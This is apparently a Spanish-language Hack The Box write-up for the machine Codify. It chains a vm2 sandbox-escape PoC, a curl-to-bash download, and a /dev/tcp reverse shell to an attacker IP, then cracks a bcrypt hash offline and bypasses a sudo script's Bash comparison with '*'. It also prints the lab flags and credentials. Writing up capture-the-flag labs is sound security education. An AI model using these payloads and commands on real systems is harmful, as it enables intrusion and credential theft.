# Hack The Box — Codify

## Informe técnico didáctico

**Máquina:** Codify
**Plataforma:** Hack The Box
**Sistema:** Linux
**Dificultad:** Easy
**Fecha de trabajo:** 2026-05-06, zona Europe/Madrid
**Estado:** Resuelta
**Usuario inicial obtenido:** `svc`
**Usuario lateral:** `joshua`
**Usuario final:** `root`

---

## 1. Sinopsis técnica

Codify expone una aplicación web desarrollada con Node.js/Express que permite ejecutar fragmentos de código JavaScript dentro de un entorno de sandbox. La propia aplicación documenta el uso de `vm2` y enlaza a la versión `3.9.16`, lo que convierte la superficie web en una vía candidata para un escape de sandbox.

La resolución se apoya en una cadena de evidencias progresiva:

1. enumeración inicial con `Inici-HTB`;
2. identificación de una aplicación Node.js/Express en los puertos `80` y `3000`;
3. detección de `vm2 3.9.16` como tecnología de sandbox;
4. validación benigna del endpoint `/run`;
5. comprobación de bloqueo directo de módulos sensibles como `child_process`;
6. explotación de una vulnerabilidad pública compatible con la versión observada;
7. obtención de shell como `svc`;
8. búsqueda de artefactos locales de aplicación;
9. extracción de un hash bcrypt de `joshua` desde una base SQLite;
10. crackeo offline del hash y acceso SSH como `joshua`;
11. revisión de permisos `sudo`;
12. análisis de un script de backup ejecutable como `root`;
13. abuso de una comparación insegura en Bash;
14. captura de la contraseña real mediante observación de procesos con `pspy`;
15. autenticación como `root` y lectura de la flag final.

La cadena completa queda resumida así:

```text
Node.js/Express
-> vm2 3.9.16
-> escape de sandbox
-> shell como svc
-> SQLite tickets.db
-> hash bcrypt de joshua
-> crackeo offline
-> SSH como joshua
-> sudo sobre mysql-backup.sh
-> bypass con *
-> pspy captura contraseña real
-> su root
```

---

## 2. Preparación y arranque del laboratorio

### 2.1 Uso de `Inici-HTB`

El caso comenzó con la ejecución del script propio `Inici-HTB`, utilizado para preparar el entorno de trabajo, comprobar conectividad y generar una base inicial de evidencias.

```bash
Inici-HTB Codify 10.129.40.127 easy
```

Este script no explota nada. Su valor está en ordenar el laboratorio desde el inicio y dejar una estructura mínima de trabajo:

```text
Codify/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

La idea didáctica de esta fase es importante: antes de buscar vulnerabilidades, se necesita saber qué superficie real existe. En una máquina Linux sencilla, un mal arranque suele provocar dos errores: saltar a explotación sin evidencia o perder tiempo en ramas secundarias.

### 2.2 Evidencia inicial

La máquina respondió al ping:

```text
64 bytes from 10.129.40.127: icmp_seq=1 ttl=63 time=47.4 ms
```

El TTL `63` y la salida de `whichSystem.py` apuntaron a Linux:

```text
10.129.40.127 (ttl -> 63): Linux
```

El escaneo completo de puertos detectó tres puertos abiertos:

```text
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

El escaneo de servicios precisó mejor la superficie:

```text
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
```

Además, el puerto `80` mostraba una redirección hacia:

```text
http://codify.htb/
```

### 2.3 Lectura de la fase 1

La primera decisión metodológica fue clara:

```text
Superficie dominante: HTTP / aplicación web
Rama principal: WEB-BASE
Ramas secundarias: SSH
Siguiente paso único: resolver codify.htb y observar la aplicación web por 80 y 3000
```

SSH quedó anotado como vía secundaria porque estaba abierto, pero no existían credenciales. La superficie dominante era web, con dos señales muy fuertes:

```text
80/tcp   -> Apache con redirección a codify.htb
3000/tcp -> aplicación Node.js Express con título Codify
```

---

## 3. Normalización del hostname y comparación de superficies HTTP

### 3.1 Resolución de `codify.htb`

Nmap ya había revelado el hostname `codify.htb`, por lo que se añadió al fichero `/etc/hosts`:

```bash
echo "10.129.40.127 codify.htb" | sudo tee -a /etc/hosts
```

Comprobación:

```bash
getent hosts codify.htb
```

Salida:

```text
10.129.40.127   codify.htb
```

Este paso era necesario porque el puerto `80` redirigía hacia el nombre de host. Si la máquina atacante no resolvía `codify.htb`, las peticiones HTTP no iban a representar correctamente el comportamiento real de la aplicación.

### 3.2 Comparación entre IP, hostname y puerto 3000

Se revisaron cabeceras HTTP por IP, por hostname y por el puerto directo `3000`:

```bash
curl -sS -I http://10.129.40.127
curl -sS -I http://codify.htb
curl -sS -I http://codify.htb:3000
```

La IP redirigía al hostname:

```text
HTTP/1.1 301 Moved Permanently
Server: Apache/2.4.52 (Ubuntu)
Location: http://codify.htb/
```

El hostname devolvía `200 OK` y mostraba Express detrás de Apache:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Length: 2269
```

El puerto `3000` devolvía la misma longitud y también `X-Powered-By: Express`:

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Length: 2269
```

La interpretación fue que Apache en el puerto `80` actuaba como frontal o proxy, mientras que el puerto `3000` exponía directamente la aplicación Express. En ambos casos se alcanzaba el mismo backend.

### 3.3 Extracción de rutas públicas

Se extrajeron recursos visibles desde la página principal:

```bash
curl -sS http://codify.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
curl -sS http://codify.htb:3000 | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
```

Rutas observadas:

```text
/about
/editor
/limitations
```

`robots.txt` no existía como recurso válido:

```text
Cannot GET /robots.txt
```

`whatweb` confirmó la lectura tecnológica:

```text
http://codify.htb      -> Apache 2.4.52 + Express + Bootstrap 4.3.1
http://codify.htb:3000 -> Express + Bootstrap 4.3.1
```

### 3.4 Cierre de WEB-BASE inicial

La aplicación no mostraba un CMS, ni un login, ni un panel autenticado. Tampoco aparecían descargas ni artefactos públicos. La señal relevante era otra: la propia aplicación se presentaba como una plataforma para ejecutar código Node.js en un sandbox.

El texto visible indicaba:

```text
Codify uses sandboxing technology to run your code.
```

Eso cambió el foco. La web dejaba de ser una superficie genérica y pasaba a ser una aplicación que ejecuta código no confiable.

---

## 4. Identificación de la tecnología de sandbox

### 4.1 Descarga de páginas informativas

Se guardaron las rutas públicas relevantes:

```bash
mkdir -p content/web

curl -sS http://codify.htb/about -o content/web/about.html
curl -sS http://codify.htb/limitations -o content/web/limitations.html
curl -sS http://codify.htb/editor -o content/web/editor.html
```

La razón para guardar estas páginas era conservar evidencia local y poder buscar términos técnicos sin depender del navegador.

### 4.2 Búsqueda de términos clave

Se buscaron indicadores relacionados con ejecución de código, sandboxing y módulos de Node.js:

```bash
grep -RniE 'sandbox|node|vm2|module|require|child_process|limitations|restricted|editor|code' content/web/
```

La página `/about` identificó la tecnología de sandbox:

```text
The vm2 library is a widely used and trusted tool for sandboxing JavaScript.
```

Además, enlazaba a:

```text
https://github.com/patriksimek/vm2/releases/tag/3.9.16
```

Esta fue una señal muy fuerte de versión, aunque se debe describir con precisión: es una versión observada desde la aplicación, no una versión confirmada desde el sistema de ficheros.

### 4.3 Restricciones declaradas por la aplicación

La página `/limitations` indicaba que ciertos módulos estaban restringidos:

```text
Restricted Modules:
- child_process
- fs
```

También listaba módulos permitidos:

```text
url
crypto
util
events
assert
stream
path
os
zlib
```

Esta información ayuda a entender el modelo defensivo de la aplicación. No se trata de una ejecución Node.js sin controles; hay un intento explícito de bloquear módulos peligrosos. Sin embargo, esa capa no demuestra que el sandbox sea seguro.

### 4.4 Flujo real del editor

El fichero `editor.html` reveló cómo se envía el código al backend:

```text
textarea id="code"
button onclick="runCode()"
fetch('/run', {
  method: 'POST',
  body: JSON.stringify({ code: encodedCode })
})
```

El navegador codifica el contenido con `btoa()`:

```javascript
const code = document.getElementById('code').value;
const encodedCode = btoa(code);
```

y lo envía a:

```text
POST /run
```

La superficie técnica dominante pasa a ser:

```text
Aplicación Node.js/Express
-> editor de código JavaScript
-> sandbox vm2
-> versión observada 3.9.16
-> endpoint POST /run
-> código enviado en Base64 dentro de JSON
```

---

## 5. Validación benigna del endpoint `/run`

### 5.1 Por qué validar antes de explotar

Antes de usar una PoC pública, se validó el flujo de forma benigna. Este paso evita confundir un problema de formato, Base64, JSON o endpoint con un fallo de explotación.

Se preparó un código inocuo:

```javascript
console.log("HTB-Codify-test")
```

y se codificó en Base64:

```bash
node -e 'console.log(Buffer.from("console.log(\"HTB-Codify-test\")").toString("base64"))'
```

Salida:

```text
Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp
```

### 5.2 Prueba contra `/run`

Se reprodujo desde terminal lo que hacía el navegador:

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp"}' | jq
```

Respuesta:

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

La misma prueba funcionó contra el puerto directo `3000`:

```bash
curl -sS -X POST http://codify.htb:3000/run \
  -H "Content-Type: application/json" \
  -d '{"code":"Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp"}' | jq
```

Respuesta:

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

La lectura es clara: el endpoint `/run` acepta JSON, espera `code` en Base64, ejecuta el JavaScript dentro del backend y devuelve la salida en el campo `output`.

### 5.3 Validación de módulo restringido

Después se comprobó si la restricción sobre `child_process` era real. Se envió el equivalente a:

```javascript
require("child_process")
```

codificado como:

```text
cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp
```

Petición:

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp"}' | jq
```

Respuesta:

```json
{
  "error": "Module \"child_process\" is not allowed"
}
```

Este resultado no descarta la vía de explotación. Al contrario, aclara el modelo defensivo: la aplicación bloquea importaciones directas de módulos peligrosos y delega la seguridad real del aislamiento en `vm2`.

La pregunta técnica ya no es:

```text
¿puede importarse child_process directamente?
```

La pregunta pasa a ser:

```text
¿puede escaparse del sandbox vm2 pese a esas restricciones?
```

---

## 6. Candidata pública: escape de sandbox en `vm2`

La revisión de vulnerabilidades públicas asociadas a `vm2 3.9.16` conduce a **CVE-2023-30547**, una vulnerabilidad de escape de sandbox en `vm2`. Según las notas de trabajo, esta candidata afecta a versiones hasta `3.9.16`, está relacionada con una sanitización incorrecta de excepciones y fue corregida posteriormente.

En esta fase se separan tres niveles:

### Hecho verificado

La aplicación usa `vm2` y enlaza a `3.9.16`.

### Inferencia razonable

La versión en uso puede ser vulnerable a CVE-2023-30547.

### Pendiente hasta validación

La vulnerabilidad debe probarse en el endpoint real `/run` y demostrar ejecución fuera del sandbox.

---

## 7. Validación del escape de sandbox

### 7.1 Prueba mínima con `id`

La validación inicial se realizó desde la página:

```text
http://codify.htb/editor
```

Se pegó una PoC pública adaptada para ejecutar `id`:

```javascript
const {VM} = require("vm2");
const vm = new VM();
const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`
console.log(vm.run(code));
```

La salida fue:

```text
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

La importancia de esta prueba es que `child_process` estaba bloqueado por importación directa. Obtener la salida de `id` demuestra que la ejecución ya no está limitada al flujo normal del sandbox y que se ha alcanzado el contexto del proceso Node.js del backend.

### 7.2 Preparación de reverse shell

Se creó un script local `rev.sh` en la máquina atacante:

```bash
cat > rev.sh <<'EOF'
#!/bin/bash
sh -i >& /dev/tcp/10.10.15.26/4444 0>&1
EOF

chmod +x rev.sh
cat rev.sh
```

Contenido:

```bash
#!/bin/bash
sh -i >& /dev/tcp/10.10.15.26/4444 0>&1
```

Se inició un servidor HTTP para servir el script:

```bash
python3 -m http.server 8081
```

Y un listener para recibir la conexión:

```bash
nc -lnvp 4444
```

Antes de ejecutar la PoC fue necesario confirmar la IP real de la interfaz VPN:

```bash
ip -4 addr show tun0
```

Salida relevante:

```text
inet 10.10.15.26/23 scope global tun0
```

Este control evitó mezclar IPs en el script y en el `curl` de la PoC.

### 7.3 PoC para obtener shell

En `/editor` se ejecutó la PoC modificada para descargar y ejecutar `rev.sh`:

```javascript
const {VM} = require("vm2");
const vm = new VM();
const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.15.26:8081/rev.sh|bash');
}
`
console.log(vm.run(code));
```

En el listener se recibió conexión desde la máquina víctima:

```text
connect to [10.10.15.26] from (UNKNOWN) [10.129.40.127] 41374
sh: 0: can't access tty; job control turned off
```

Se estabilizó mínimamente la shell:

```bash
script /dev/null -c bash
export TERM=xterm
```

Validación de contexto:

```bash
whoami
id
hostname
pwd
```

Salida:

```text
svc
uid=1001(svc) gid=1001(svc) groups=1001(svc)
codify
/home/svc
```

La fase de acceso inicial queda cerrada: el usuario inicial es `svc`.

---

## 8. Enumeración local tras foothold

### 8.1 Identificación de usuarios interactivos

Se revisó `/etc/passwd` para detectar usuarios locales con shell:

```bash
cat /etc/passwd
```

Usuarios relevantes:

```text
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

Esta salida orientó el movimiento lateral: si la aplicación almacenaba credenciales o hashes, `joshua` era el usuario local candidato.

### 8.2 Búsqueda de artefactos web

La bitácora de referencia apuntaba a `/var/www/contacts`, pero esa ruta no existía en la instancia trabajada. En lugar de insistir sobre una ruta no verificada, se enumeró `/var/www`:

```bash
ls -la /var/www && find /var/www -maxdepth 5 -type f -name tickets.db 2>/dev/null && find /var/www -maxdepth 5 -type f -name "*.db" 2>/dev/null
```

Salida relevante:

```text
drwxr-xr-x  3 svc  svc  4096 Sep 12  2023 contact
drwxr-xr-x  4 svc  svc  4096 Sep 12  2023 editor
drwxr-xr-x  2 svc  svc  4096 Apr 12  2023 html
/var/www/contact/tickets.db
/var/www/contact/tickets.db
```

La ruta correcta era:

```text
/var/www/contact/tickets.db
```

Este ajuste es metodológicamente importante: la referencia orienta, pero la evidencia de la máquina manda.

### 8.3 Confirmación de la base SQLite

Se revisó el directorio real:

```bash
cd /var/www/contact && pwd && ls -la && file tickets.db && which sqlite3
```

Salida:

```text
/var/www/contact
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12  2023 tickets.db
tickets.db: SQLite 3.x database
/usr/bin/sqlite3
```

La máquina tenía `sqlite3` instalado, por lo que no fue necesario transferir la base para leerla.

---

## 9. Extracción de hash desde `tickets.db`

### 9.1 Enumeración de tablas

Se listaron las tablas:

```bash
sqlite3 /var/www/contact/tickets.db ".tables"
```

Salida:

```text
tickets  users
```

La tabla `users` pasó a ser prioritaria, porque podía contener credenciales o hashes reutilizables.

### 9.2 Volcado de la tabla `users`

Se mostró esquema y contenido:

```bash
sqlite3 /var/www/contact/tickets.db ".schema users" ".headers on" ".mode column" "SELECT * FROM users;"
```

Salida:

```sql
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
```

Contenido:

```text
id  username  password
--  --------  ------------------------------------------------------------
3   joshua    $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

El prefijo `$2a$12$` permitió clasificar el hash como bcrypt.

### 9.3 Crackeo offline

El hash se guardó en la máquina atacante:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Codify

mkdir -p loot

cat > loot/joshua_hash.txt <<'EOF'
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
EOF

cat loot/joshua_hash.txt
```

Se lanzó Hashcat en modo bcrypt:

```bash
hashcat -m 3200 loot/joshua_hash.txt /usr/share/wordlists/rockyou.txt
```

Resultado:

```text
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
Status: Cracked
Hash.Mode: 3200 (bcrypt $2*$, Blowfish (Unix))
```

Credencial obtenida:

```text
joshua:spongebob1
```

La contraseña fue crackeada offline, no en la víctima. Esto reduce ruido en el sistema objetivo y mantiene la fase de credenciales separada de la enumeración local.

---

## 10. Movimiento lateral por SSH

Desde fase 1 se sabía que SSH estaba abierto:

```text
22/tcp open ssh OpenSSH 8.9p1 Ubuntu
```

Se probó la contraseña recuperada contra el usuario local `joshua`:

```bash
ssh joshua@10.129.40.127
```

Contraseña:

```text
spongebob1
```

Acceso confirmado:

```text
whoami -> joshua
id     -> uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
hostname -> codify
pwd    -> /home/joshua
```

Se leyó la flag de usuario:

```bash
cat user.txt
```

Salida:

```text
11dd43c706035918d593ce3b7cbd24fd
```

La cadena de movimiento lateral queda cerrada:

```text
svc
-> tickets.db
-> hash bcrypt de joshua
-> crackeo offline
-> spongebob1
-> SSH como joshua
```

---

## 11. Enumeración sudo como `joshua`

### 11.1 Revisión de permisos sudo

La primera comprobación de escalada local fue:

```bash
sudo -l
```

Contraseña usada:

```text
spongebob1
```

Salida relevante:

```text
User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

La prioridad cambió: ya no importaba la base SQLite ni la web. La vía principal era ahora un script custom ejecutable como `root`.

### 11.2 Inspección del script antes de ejecutarlo

Se revisaron permisos, tipo y contenido:

```bash
ls -la /opt/scripts/mysql-backup.sh
file /opt/scripts/mysql-backup.sh
sed -n '1,220p' /opt/scripts/mysql-backup.sh
```

Permisos:

```text
-rwxr-xr-x 1 root root 928 Nov  2  2023 /opt/scripts/mysql-backup.sh
```

Tipo:

```text
/opt/scripts/mysql-backup.sh: Bourne-Again shell script, ASCII text executable
```

Contenido relevante:

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

Después usa la contraseña real en comandos MySQL:

```bash
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
```

y:

```bash
/usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db"
```

---

## 12. Análisis de la vulnerabilidad del script

El script contiene dos debilidades útiles en cadena.

### 12.1 Comparación insegura en Bash

La línea crítica es:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
```

En Bash, dentro de `[[ ... == ... ]]`, el lado derecho de la comparación puede comportarse como patrón. Si se introduce `*`, puede coincidir con cualquier contraseña.

Se validó ejecutando:

```bash
sudo /opt/scripts/mysql-backup.sh
```

Cuando el script preguntó:

```text
Enter MySQL password for root:
```

se introdujo:

```text
*
```

Salida:

```text
Password confirmed!
```

El bypass estaba confirmado.

### 12.2 Exposición de contraseña por argumentos de proceso

Tras el bypass, el script ejecuta `mysql` y `mysqldump` con la contraseña en línea de comandos:

```bash
-p"$DB_PASS"
```

Esto genera incluso advertencias:

```text
mysql: [Warning] Using a password on the command line interface can be insecure.
mysqldump: [Warning] Using a password on the command line interface can be insecure.
```

La advertencia es una pista excelente: si la contraseña viaja como argumento del proceso, puede observarse temporalmente con una herramienta como `pspy`.

---

## 13. Captura de la contraseña real con `pspy`

### 13.1 Preparación en la máquina atacante

Se descargó `pspy64s`:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Codify

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s -O pspy64s

python3 -m http.server 8082
```

### 13.2 Transferencia a la víctima

Desde la sesión SSH como `joshua`:

```bash
cd /tmp

wget http://10.10.15.26:8082/pspy64s -O pspy64s

chmod +x pspy64s

./pspy64s
```

`pspy` se dejó corriendo en una sesión SSH.

### 13.3 Segunda sesión SSH para disparar el script

Se abrió otra sesión SSH como `joshua` y se ejecutó:

```bash
sudo /opt/scripts/mysql-backup.sh
```

Es importante distinguir los dos prompts:

```text
[sudo] password for joshua:
```

Aquí va la contraseña de `joshua`:

```text
spongebob1
```

Luego aparece el prompt del script:

```text
Enter MySQL password for root:
```

Aquí va el comodín:

```text
*
```

### 13.4 Contraseña capturada

`pspy` capturó el proceso `mysqldump`:

```text
/usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql
```

Contraseña recuperada:

```text
kljh12k3jhaskjh12kjh3
```

La línea confirma tres hechos:

1. el proceso se ejecuta como `UID=0`;
2. el script usa la contraseña real leída desde `/root/.creds`;
3. esa contraseña aparece expuesta en los argumentos del proceso.

---

## 14. Escalada final a `root`

Se probó reutilización de la contraseña con `su root`:

```bash
su root
```

Contraseña:

```text
kljh12k3jhaskjh12kjh3
```

Validación:

```bash
whoami
id
hostname
pwd
cat /root/root.txt
```

Salida:

```text
root
uid=0(root) gid=0(root) groups=0(root)
codify
/home/joshua
12366f1e417e8d87083a018e0ffdb931
```

La flag de root fue:

```text
12366f1e417e8d87083a018e0ffdb931
```

---

## 15. Resumen técnico final

### 15.1 Cadena de explotación

```text
1. Fase 1:
   - Linux detectado por TTL.
   - Puertos abiertos: 22, 80, 3000.
   - Web dominante.

2. WEB-BASE:
   - Apache en 80.
   - Express en 3000.
   - Misma aplicación por hostname y puerto directo.
   - Rutas públicas: /about, /editor, /limitations.

3. Tecnología:
   - Aplicación para probar código Node.js.
   - Sandbox identificado: vm2.
   - Versión observada: 3.9.16.
   - Endpoint real: POST /run.
   - Código enviado en Base64.

4. Validaciones:
   - /run ejecuta código benigno.
   - child_process está bloqueado por importación directa.
   - La vía correcta es escape de sandbox, no require directo.

5. Foothold:
   - PoC compatible con vm2 3.9.16.
   - Ejecución de id como svc.
   - Reverse shell como svc.

6. Movimiento lateral:
   - /var/www/contact/tickets.db localizado.
   - Base SQLite válida.
   - Tabla users contiene hash bcrypt de joshua.
   - Hashcat recupera spongebob1.
   - SSH como joshua.
   - user.txt obtenido.

7. Escalada:
   - sudo -l permite /opt/scripts/mysql-backup.sh como root.
   - Script lee /root/.creds.
   - Comparación insegura permite bypass con *.
   - mysql/mysqldump exponen password por argumentos.
   - pspy captura kljh12k3jhaskjh12kjh3.
   - su root funciona.
   - root.txt obtenido.
```

### 15.2 Flags

```text
user.txt: 11dd43c706035918d593ce3b7cbd24fd
root.txt: 12366f1e417e8d87083a018e0ffdb931
```

### 15.3 Credenciales y secretos del caso

```text
joshua:spongebob1
root / MySQL password: kljh12k3jhaskjh12kjh3
```

---

## 16. Lecciones reutilizables

### 16.1 Leer la aplicación antes de buscar exploits

Codify enseña que una web sencilla puede revelar su propia vía de ataque si se leen bien sus páginas. `/about`, `/limitations` y `/editor` aportaron más valor que un fuzzing genérico temprano.

Patrón reutilizable:

```text
landing simple
-> páginas informativas
-> tecnología declarada
-> versión observada
-> endpoint funcional
-> validación benigna
-> análisis de candidata pública
```

### 16.2 Distinguir bloqueo directo de seguridad real

El bloqueo de `child_process` no hacía segura la aplicación. Solo impedía una vía directa. La protección real dependía de `vm2`, y la versión observada era vulnerable.

Lección:

```text
Un filtro sobre módulos peligrosos no equivale a un sandbox robusto.
```

### 16.3 Validar el flujo antes de explotar

Antes de la PoC, se confirmó que `/run` aceptaba JSON, requería Base64 y devolvía salida en `output`. Esta validación evitó errores de interpretación.

Lección:

```text
Si un exploit falla, primero hay que saber si el flujo básico funciona.
```

### 16.4 La evidencia real corrige la ruta del writeup

La ruta esperada era `/var/www/contacts`, pero la máquina tenía `/var/www/contact`.

Lección:

```text
La bitácora orienta; la evidencia manda.
```

### 16.5 Las bases locales de aplicación son pivotes frecuentes

`tickets.db` contenía el hash de `joshua`. Este patrón es muy común tras un foothold web: la aplicación suele tener bases locales, ficheros `.env`, configuraciones o artefactos que permiten moverse a otro usuario.

### 16.6 El crackeo se hace offline

El hash bcrypt se extrajo y se crackeó en la máquina atacante. No se ejecutó crackeo en la víctima.

Lección:

```text
Extraer artefacto -> clasificar hash -> crackeo offline -> validar reutilización
```

### 16.7 No ejecutar scripts sudo sin leerlos

`sudo -l` mostró un script custom. La vía correcta fue leerlo antes de ejecutarlo. El fallo estaba en su lógica: lectura de `/root/.creds`, comparación insegura y uso de la contraseña como argumento.

### 16.8 Las advertencias importan

El mensaje:

```text
Using a password on the command line interface can be insecure
```

no era ruido. Era una pista directa de que la contraseña podía verse en procesos.

### 16.9 Diferenciar prompts evita errores

En la escalada hubo dos prompts distintos:

```text
[sudo] password for joshua:      -> spongebob1
Enter MySQL password for root:   -> *
```

Confundirlos produce fallos de autenticación que no tienen que ver con la vulnerabilidad.

### 16.10 Incidencias operativas que no son hallazgos de la máquina

Durante el laboratorio aparecieron incidencias locales útiles para recordar, pero no deben confundirse con vulnerabilidades de Codify:

- usar `path` como variable en `zsh` rompió temporalmente la resolución de comandos como `curl`, `grep` y `sort`;
- un `heredoc` con bloques Markdown internos puede quedar mal copiado;
- el pegado sucio en shell se corrigió con:

```bash
bind 'set enable-bracketed-paste off'
```

Estas incidencias son útiles para el aprendizaje operativo, pero no forman parte de la explotación de la máquina.

---

## 17. Correcciones editoriales aplicadas

En el cuerpo principal se aplicaron correcciones editoriales y de claridad sin alterar la cadena técnica:

- se corrigió `Hack Yhe Box` a `Hack The Box`;
- se normalizó la ruta real como `/var/www/contact`, explicando que `/var/www/contacts` no existía en la instancia;
- se cambió la expresión errónea `Análisis observada` por `Respuesta observada`;
- se eliminó la rigidez repetitiva de bloques tipo “Objetivo / Hechos verificados / Método” en cada microfase, integrando su contenido en una narrativa técnica natural;
- se mantuvieron las incidencias operativas relevantes como lecciones, pero separadas de los hallazgos de la máquina;
- no se inventaron pasos nuevos ni se sustituyó la explotación real por una cadena alternativa.

Las notas originales se conservan completas a continuación como anexo de trazabilidad.

---

# Anexo A — Notas originales conservadas

A partir de este punto se conserva el material original aportado para mantener trazabilidad documental del caso.

---

### Iniciamos la explotación de la máquina Codify de Hack The Box.

## Sinopsis

Codify es una máquina Linux fácil que presenta una aplicación web que permite a los usuarios probar código Node.js. La aplicación utiliza una biblioteca `vm2` vulnerable, que se aprovecha para obtener ejecución remota de código. La enumeración del objetivo revela una base de datos SQLite que contiene un hash que, una vez crackeado, proporciona acceso SSH a la máquina. Finalmente, un script Bash vulnerable puede ejecutarse con privilegios elevados para revelar la contraseña del usuario `root`, lo que conduce a acceso privilegiado a la máquina.

# Ejecución de `Inici-HTB` para preparar el entorno de trabajo y generar la base de evidencias iniciales.

## Preparación inicial automatizada

Al comenzar la máquina se ejecuta el script propio `Inici-HTB`, utilizado para preparar el entorno de trabajo y realizar una primera enumeración técnica controlada.

```bash
Inici-HTB <NOMBRE_MAQUINA> <IP_OBJETIVO>
```

Este script no explota nada. Su función es dejar el laboratorio ordenado desde el primer minuto, validar conectividad y generar una base mínima de evidencias para decidir la siguiente rama de trabajo.

---

## Qué prepara el script

`Inici-HTB` crea una estructura de trabajo separada para la máquina, con directorios destinados a organizar la enumeración, el contenido descargado, posibles pruebas posteriores y notas del caso.

Estructura genérica esperada:

```text
<directorio_maquina>/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

---

## Finalidad de cada directorio

### `content/`

Directorio reservado para material obtenido durante la enumeración o el análisis posterior:

- páginas descargadas;
- ficheros públicos;
- respuestas HTTP;
- artefactos útiles;
- resultados de herramientas específicas;
- documentación o evidencias relevantes.

### `exploits/`

Directorio reservado para pruebas o material de explotación usado por el operador del laboratorio, cuando proceda.

No se utiliza en la fase inicial salvo que más adelante se confirme una vía concreta y justificada.

### `nmap/`

Directorio donde se guardan las evidencias de conectividad y enumeración inicial.

Archivos principales:

- `ping.txt`
  Guarda la comprobación inicial de conectividad contra la IP objetivo.

- `whichSystem.txt`
  Guarda la estimación inicial del sistema operativo, normalmente a partir de TTL u otras señales tempranas.

- `allPorts`
  Guarda el resultado del escaneo completo de puertos TCP abiertos.

- `extractPorts.txt`
  Guarda la extracción de puertos abiertos para reutilizarlos en el escaneo de servicios.

- `nmap_tcp_services.txt`
  Guarda el escaneo detallado de servicios, versiones y scripts básicos sobre los puertos abiertos.

### `notes/`

Directorio donde se crean notas iniciales del caso.

Archivos generados:

- `00_resumen_inicial.md`
  Resume los datos iniciales de la máquina: IP, fecha, sistema estimado, puertos abiertos, servicios detectados, superficie dominante sugerida, ramas secundarias y siguiente paso único.

- `01_siguiente_paso.txt`
  Guarda de forma aislada el siguiente paso recomendado para continuar con el roadmap correspondiente.

---

## Qué ejecuta el script de forma resumida

El flujo automatizado realiza estas acciones:

1. registra el objetivo de trabajo;
2. prepara el árbol de directorios;
3. valida conectividad con `ping`;
4. estima el sistema operativo con `whichSystem.py`;
5. ejecuta un escaneo completo de puertos TCP;
6. extrae los puertos abiertos;
7. ejecuta un escaneo de servicios sobre esos puertos;
8. infiere una superficie dominante inicial;
